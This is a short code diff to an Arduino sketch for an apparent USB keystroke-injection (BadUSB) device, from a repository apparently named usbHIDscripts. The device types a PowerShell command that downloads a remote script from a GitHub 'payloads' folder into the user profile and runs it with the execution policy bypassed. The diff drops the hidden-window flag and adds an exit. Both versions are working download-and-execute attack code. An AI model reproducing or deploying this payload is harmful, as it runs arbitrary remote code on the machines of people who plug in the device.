@@ -22,7 +22,7 @@ void setup() {
   delay(50);
   Keyboard.releaseAll();
   delay(500);
-  const char* cmd = "powershell.exe -WindowStyle Hidden -NoProfile -Command \"$p = Join-Path $env:USERPROFILE 'execute.ps1'; curl.exe 'https://raw.githubusercontent.com/e30301/usbHIDscripts/refs/heads/main/payloads/execute.ps1' -o $p; powershell.exe -ExecutionPolicy Bypass -File $p\"";
+  const char* cmd = "powershell.exe -NoProfile -Command \"$p = Join-Path $env:USERPROFILE 'execute.ps1'; curl.exe 'https://raw.githubusercontent.com/e30301/usbHIDscripts/refs/heads/main/payloads/execute.ps1' -o $p; powershell.exe -ExecutionPolicy Bypass -File $p; exit\"";
   typeString(cmd, 15);
   Keyboard.press(KEY_RETURN);
   delay(10);
